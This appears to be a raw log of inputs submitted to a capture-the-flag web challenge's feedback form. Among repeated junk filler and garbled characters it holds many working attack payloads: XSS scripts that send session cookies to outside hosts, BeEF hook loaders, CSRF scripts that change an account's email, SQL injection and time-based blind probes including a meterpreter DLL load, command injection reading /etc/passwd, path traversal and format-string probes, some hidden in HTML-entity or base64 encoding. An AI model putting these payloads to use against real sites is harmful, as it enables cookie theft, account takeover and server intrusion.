+<!--<script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>-->
+<script type="text/javascript">
+$.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/', function(data) {
+  $.get('http://109.111.143.109:12345/'+data, function(data2) { 
+});
+});
+
+</script>
+</body></html>
+
+ˇ_
+tetetettet
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://www.tunelko.com?c=" + $.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/');</script>
+aaa
+<html>
+<head></head>
+<body>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<!--<script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>-->
+<script type="text/javascript">
+$.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/', function(data) {
+  $.get('http://109.111.143.109:12345/', data, function(data2) { 
+});
+});
+
+</script>
+</body></html>
+
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://www.tunelko.com?c=" + $.get('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/');</script>
+aaaa
+<html>
+<head></head>
+<body>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<!--<script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>-->
+<script type="text/javascript">
+$.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/', function(data) {
+  $.post('http://109.111.143.109:12345/', data, function(data2) { 
+});
+});
+
+</script>
+</body></html>
+
+Ü8dé
+
+Ôü8ﬂn{
+
+Ü9!
+Ü9!
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://www.tunelko.com?c=" + $.post('/web100_f977a5eaea38b2dcd992c112bdb84b9a/');</script>
+
+Å◊‡
+h2so4
+h2so4full
+<script src="http://codeorigin.jquery.com/jquery-migrate-1.2.1.js"><script>
+url = $.ajax('/web100_f977a5eaea38b2dcd992c112bdb84b9a/');
+document.location="http://www.tunelko.com?c=" + url;</script>
+<html>
+<head></head>
+<body>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<!--<script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>-->
+<script type="text/javascript">
+$.post('/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change', 'password=&newpassword=&email=huffbzyc3%40shitmail.me&confirm=Change+Email', function(data) {
+  $.post('http://109.111.143.109:12345/', data, function(data2) { 
+});
+});
+</script>
+</body></html>
+
+Hello mario
+<script src="http://codeorigin.jquery.com/jquery-migrate-1.2.1.js"><script>
+document.location="http://www.tunelko.com?c=" + $.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/')</script>
+Please reset my password
+wtf
+wtf
+wtf
+F33b4ck
+<script>var f=document.forms[0];var email=document.getElementsByName("email");email[0].value="chimbaobao@gmail.com";f.submit();</script>
+
+<html>
+<head></head>
+<body>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script type="text/javascript">
+$.post('/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change', 'password=&newpassword=&email=tunelko%40gmail.me&confirm=Change+Email', function(data) {
+  $.post('http://tunelko.com/', data, function(data2) { 
+});
+});
+</script>
+</body></html>
+
+<scrip>
+var f = document.forms[0];
+var email = document.getElementsByName("email");
+email[0].value = "chimbaobao@gmail.com";
+f.submit();
+</script>
+
+<script>
+function sendMail() {
+    var link = "mailto:vn.rootkit@gmail.com"
+             + "&subject=" + escape("This is my subject")
+             + "&body=" + document.cookie
+    ;
+
+    window.location.href = link;
+}
+</script>
+<script>
+function sendMail() {
+    var link = "mailto:vn.rootkit@gmail.com"
+             + "&subject=" + escape("This is my subject")
+             + "&body=" + document.cookie;
+}
+sendMail();
+</script>
+<script>
+function sendMail() {
+    var link = "mailto:vn.rootkit@gmail.com"
+             + "&subject=" + escape("This is my subject")
+             + "&body=" + document.cookie
+    ;
+}
+sendMail();
+</script>
+shit
+<script>
+function sendMail() {
+    var link = "mailto:vn.rootkit@gmail.com?subject='his is my subject'&body='" + document.cookie +"'";
+	window.open(link);
+}
+sendMail();
+
+</script>
+<script>
+function sendMail() {
+    var link = "mailto:vn.rootkit@gmail.com?subject='This is my subject'&body='" + document.cookie +"'";
+	window.open(link);
+}
+sendMail();
+
+</script>
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x0A;&#x66;&#x75;&#x6E;&#x63;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x73;&#x65;&#x6E;&#x64;&#x4D;&#x61;&#x69;&#x6C;&#x28;&#x29;&#x20;&#x7B;&#x0A;&#x20;&#x20;&#x20;&#x20;&#x76;&#x61;&#x72;&#x20;&#x6C;&#x69;&#x6E;&#x6B;&#x20;&#x3D;&#x20;&#x22;&#x6D;&#x61;&#x69;&#x6C;&#x74;&#x6F;&#x3A;&#x76;&#x6E;&#x2E;&#x72;&#x6F;&#x6F;&#x74;&#x6B;&#x69;&#x74;&#x40;&#x67;&#x6D;&#x61;&#x69;&#x6C;&#x2E;&#x63;&#x6F;&#x6D;&#x3F;&#x73;&#x75;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x3D;&#x27;&#x54;&#x68;&#x69;&#x73;&#x20;&#x69;&#x73;&#x20;&#x6D;&#x79;&#x20;&#x73;&#x75;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x27;&#x26;&#x62;&#x6F;&#x64;&#x79;&#x3D;&#x27;&#x22;&#x20;&#x2B;&#x20;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x20;&#x2B;&#x22;&#x27;&#x22;&#x3B;&#x0A;&#x09;&#x77;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x2E;&#x6F;&#x70;&#x65;&#x6E;&#x28;&#x6C;&#x69;&#x6E;&#x6B;&#x29;&#x3B;&#x0A;&#x7D;&#x0A;&#x73;&#x65;&#x6E;&#x64;&#x4D;&#x61;&#x69;&#x6C;&#x28;&#x29;&#x3B;&#x0A;&#x0A;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+i have not
+kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
+hello
+';--
+<script>
+var f = document.forms[0];
+var cookie = document.cookie;
+var email = document.getElementsByName ("email");
+email[0].value = "chimbaobao@gmail.com";
+document.cookie = cookie;
+f.submit();
+</script>
+"><javascript src='http://sovietw0rm.tk/a.js'/>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.location;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.location;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.referer;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.referer;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.referrer;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.referrer;</script>
+"><script>function text_xml()
+{
+    realXmlUrl='http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/';
+    http_request = false;
+    http_request = new XMLHttpRequest();
+    if (http_request.overrideMimeType)
+    {
+        http_request.overrideMimeType('text/xml');
+    }
+
+    http_request.onreadystatechange =   this.response_xml;
+    http_request.open('GET', realXmlUrl, true);
+    http_request.send(null);
+    xmlDoc = http_request.responseXML;
+    document.location ='http://sovietw0rm.tk:4444'+xmlDoc;
+}
+text_xml();
+</script>
+"><script>function text_xml()
+{
+    realXmlUrl='http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/';
+    http_request = false;
+    http_request = new XMLHttpRequest();
+    if (http_request.overrideMimeType)
+    {
+        http_request.overrideMimeType('text/xml');
+    }
+
+    http_request.onreadystatechange =   this.response_xml;
+    http_request.open('GET', realXmlUrl, true);
+    http_request.send(null);
+    xmlDoc = http_request.responseXML;
+    document.location ='http://sovietw0rm.tk:4444'+xmlDoc;
+}
+text_xml();
+</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+<s>
+<script>alert('document.cookie')</script>
+<script>alert('document.cookie')</script>
+<script>alert('document.cookie')</script>
+<script>alert('document.cookie')</script>
+<script>alert('document.cookie')</script>
+sdasds
+F33db4ck
+aaaaaa
+aaaaaa
+f33db4ck
+#ctf.wargame.vn
+1
+1
+ddddddddddddddddddddddddddddddddddddd
+lol
+lol
+hi <script>document.location= "http://jok3rstylelogger.altervista.org/grab/grabmore.php?cookie=" + document.cookie;</script>
+<script>alert(123)</script>
+a
+qwe
+abc
+
+=.=
+1
+#ctf.wargame.vn
+'
+admin
+aaa
+23 UNION SELECT 1,load_extension('\evilhostevilsharemeterpreter.dll','DllMain');--
+23 UNION SELECT 1;--
+123' UNION SELECT 1--
+123 UNION SELECT 1-- -
+'123 UNION SELECT 1-- -
+'123 UNION SELECT 1;-- -
+SELECT * FROM flag-- -
+123 union select 1 from flag;-- -
+check my feedback
+<script>new Image().src="http://totden89.byethost24.com/index.php?ck="+encodeURI(document.cookie);</script>
+<script>new Image().src="http://totden89.byethost24.com/index.php?ck="+encodeURI(document.cookie);</script>
+<script>alert(hell)</script>
+123456
+aaaaa
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+khoiasddsadsadsa
+
+sad
+·
+d
+·
+d
+sa
+dddddddsadsa
+ddddsad
+·
+dsa
+d
+asd
+sa
+d
+
+111111111
+11111111111111111
+1111111111111111111111111111111111111
+11111111111111111111111
+<Script>alert</sript>
+Pls help me :p
+<script>
+document.location = 'http://dhth7dlt.tk/c.php?c=' + document.cookie;
+</script>
+Pls help me :p
+<script>
+document.location = 'http://dhth7dlt.tk/c.php?c=' + document.cookie;
+</script>
+Pls help me :p
+<script>
+document.location = 'http://dhth7dlt.tk/c.php?c=' + document.cookie;
+</script>
+abc
+abc
+get flag :D
+"><script src='http://117.5.33.202:3000/hook.js'></script>
+Just for fun
+Just for fun
+Just for fun
+how
+1
+2
+3
+4
+5
+6
+7
+
+<script>alert(123)</script>
+check check check
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Mario feedback
+
+dsdsdsdsds
+dsdsdsdsds11
+dsdsdsdsds11
+dsdsdsdsds11
+dsdsdsdsds11'
+"><script src= window.location.protocol + '//' + '117.5.33.202:3000' + '/hook.js' type='text/javascript'></script>
+"><script>document.location='http://117.5.33.202:3000/demos/butcher/index.html'</script>
+"><script>document.location='http://117.5.33.202:3000/demos/butcher/index.html';</script>
+<script>window.location.href="http://lab0./uns.vn:8080/cookie.php?cookie="+document.cookie;</script>
+<script>location.href="http://lab01.uns.vn:8080/cookie.php?cookie="+document.cookie;</script>
+help
+help
+f'h"5
+help
+helpf'h"5
+help
+help
+help
+help
+help
+help
+help
+'
+''
+""
+			
+"
+''
+""
+			
+help
++
+help'
+''
+help"
+""
+help+
+			
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+SLEEP(2)
+'/*966*/+/*966*/SLEEP(2)/*966*/+/*966*/'
+"	+	SLEEP(2)	+	"
+,(select/*966*/sleep(2))/*966*/as/*966*/x
+'||pg_sleep(2)||'
+to_number(''||pg_sleep(2),'9')
+,pg_sleep(2)
+having1=to_number('1'||pg_sleep(2),'9')--
+;waitfordelay'0:0:2'--
+SLEEP(2)
+help'	+	SLEEP(2)	+	'
+);	waitfor	delay	'0:0:2'	--
+help"	+	SLEEP(2)	+	"
+';	waitfor	delay	'0:0:2'	--
+help,(select/*966*/sleep(2))/*966*/as/*966*/x
+');waitfordelay'0:0:2'--
+help'	||	pg_sleep(2)	||	'
+,master..sysdatabases;/*966*/waitfor/*966*/delay/*966*/'0:0:2'/*966*/--
+to_number(''||pg_sleep(2),'9')
+help,pg_sleep(2)
+help/*966*/having/*966*/1=to_number('1'/*966*/||/*966*/pg_sleep(2),/*966*/'9')/*966*/--
+help;	waitfor	delay	'0:0:2'	--
+help);	waitfor	delay	'0:0:2'	--
+help';/*966*/waitfor/*966*/delay/*966*/'0:0:2'/*966*/--
+help');waitfordelay'0:0:2'--
+help,master..sysdatabases;/*966*/waitfor/*966*/delay/*966*/'0:0:2'/*966*/--
+help
+help
+<script>window.location="http://192.241.177.173/get.php?s="+document.cookie;</script>
+help
+help
+"><script>document.location='http://117.5.33.202:3000/demos/butcher/index.html'</script>
+help
+help
+help
+help
+help
+ | cat /etc/passwd #
+help
+help
+'; cat /etc/passwd #
+help
+"; cat /etc/passwd #
+help
+ | type C:\boot.ini & REM
+' | type C:\boot.ini & REM 
+" | type C:\boot.ini & REM 
+ | type %SYSTEMROOT%\win.ini & REM
+' | type %SYSTEMROOT%\win.ini & REM 
+" | type %SYSTEMROOT%\win.ini & REM 
+help | cat /etc/passwd #
+help'; cat /etc/passwd #
+help"; cat /etc/passwd #
+help | type C:\boot.ini & REM
+help' | type C:\boot.ini & REM 
+help" | type C:\boot.ini & REM 
+help | type %SYSTEMROOT%\win.ini & REM
+help' | type %SYSTEMROOT%\win.ini & REM 
+help" | type %SYSTEMROOT%\win.ini & REM 
+help
+help
+ `sleep 2`
+help
+ `sleep 2` #
+help
+' ; sleep 2 #
+help
+" ; sleep 2 #
+help
+ | ping -n 3 127.0.0.1 & REM 
+help
+' | ping -n 3 127.0.0.1 & REM 
+help
+" | ping -n 3 127.0.0.1 & REM 
+help `sleep 2` #
+help' ; sleep 2 #
+help" ; sleep 2 #
+help | ping -n 3 127.0.0.1 & REM 
+help' | ping -n 3 127.0.0.1 & REM 
+help" | ping -n 3 127.0.0.1 & REM 
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+help
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/etc/passwd
+/etc/passwd
+%2fetc%2fpasswd%00
+%2fetc%2fpasswd
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWINDOWS%5cwin.ini%00
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWINDOWS%5cwin.ini
+C:\boot.ini
+../../../../../../../../../../../../../../../etc/passwd
+C:\boot.ini
+C%3a%5cboot.ini%00
+C%3a%5cboot.ini
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+%SYSTEMROOT%\win.ini
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+%SYSTEMROOT%\win.ini
+/etc/passwd
+%25SYSTEMROOT%25%5cwin.ini%00
+/etc/passwd
+%25SYSTEMROOT%25%5cwin.ini
+%2fetc%2fpasswd%00
+%2fetc%2fpasswd
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\WINDOWS\win.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWINDOWS%5cwin.ini%00
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWINDOWS%5cwin.ini
+C:\boot.ini
+C:\boot.ini
+help 'sleep 2'
+C%3a%5cboot.ini%00
+C%3a%5cboot.ini
+%SYSTEMROOT%\win.ini
+%SYSTEMROOT%\win.ini
+%25SYSTEMROOT%25%5cwin.ini%00
+%25SYSTEMROOT%25%5cwin.ini
+kj87fdsf
+./
+./
+.\
+.\
+.%2f
+.%2f%00
+.%5c
+help
+.%5c%00
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+kj87fdsf
+(fmt_%x)
+help
+help
+help
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+(fmt_%x)
+help
+help
+<img src="http://media.yeutretho.com/2013/05/17/122_165_1368765648_8_1368762889-maria-1.jpg" onload="window.location='http://192.241.177.173/get.php'+document.cookie"/>
+hehe
+<img src="http://www.pubcon.com/banners/728x90-pubcon.png" onload="document.location.href='http://192.241.177.173/get.php?s='+document.cookie"/>
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="document.location.href='http://192.241.177.173/get.php?s='+document.cookie"/>
+F33db4ck
+<script>window.location="http://192.241.177.173/get.php?s="+document.cookie;</script>
+
+dsdas
+<script>alert(document.cookie);</script>
+<img src="lab01.uns.vn:8080/cookie.php?cookie="+document.cookie></img>
+<img src="javascript:window.location='http://192.241.177.173:8080/cookie.php?cookie='+document.cookie"></img>
+haizzzzzzzz
+F33db4ck
+f33db4ck
+mario
+thienbk89
+what is this
+what is this
+demo
+demo
+' and 
+' ;--#%00
+'#;--*%00
+'#;--*%00
+'#;--*%00
+<script>alert('xss');</script>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change&password=&newpassword=&email=kinh123%40gmail.com&confirm=Change+Email
+ahc
+<script>alert(/Breaker/)</script>
+<script>document.location='http://kinhsao.com/steal_cookie.php?cookie='+document.cookie;</script>
+
+fsdfsdsdfsd
+ñâ
+i∑
+iŸ¢
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+123123
+d·
+Hackers detected
+ô™
+123
+≤Í^Æfß
+Hackers detected
+ô™
+˛)›{a
+Hackers detected!
+~V†
+123" zxc
+~V†
+ô™‚
+zÕ+ï«nÍ™bä-,kö|ı™ù∑
+
+
+i∑
+~V†
+zÕ+ï«nÍ™bä-,kö|ı™ù∑
+<script>alert('kai')</script>
+zÕ+ï«nÍ™bä-,kö|ı™ù∑
+<script>alert('kai')'</script>
+<script>alert('test');</script>
+<script>location.href = 'http://kinhsao.com/steal_cookie.php?cookie='+document.cookie;</script>
+<script>location.href = 'http://kinhsao.com/steal_cookie.php?cookie='+document.cookie;</script>
+<script>alert('flag ?');</script>
+test
+es0rlcdu6qpiii0sa5p89aqdt4
+<img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp;xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');"/>
+"<script>alert('flag!')</script>
+test
+<script>alert("test");</script>
+PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2tpbmhzYW8uY29tL2luZGV4Mi5odG1sJzs8L3NjcmlwdD4KCg==
+PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2tpbmhzYW8uY29tL2luZGV4Mi5odG1sJzwvc2NyaXB0PgoK
+ <img src="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/Brick_Block.png" onload="var xmlhttp;xmlhttp.open('POST','http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',true);xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');xmlhttp.send('password=&newpassword=&email=nguyenvuhoang%40ubuntu-vn.org&confirm=Change+Email');"/>
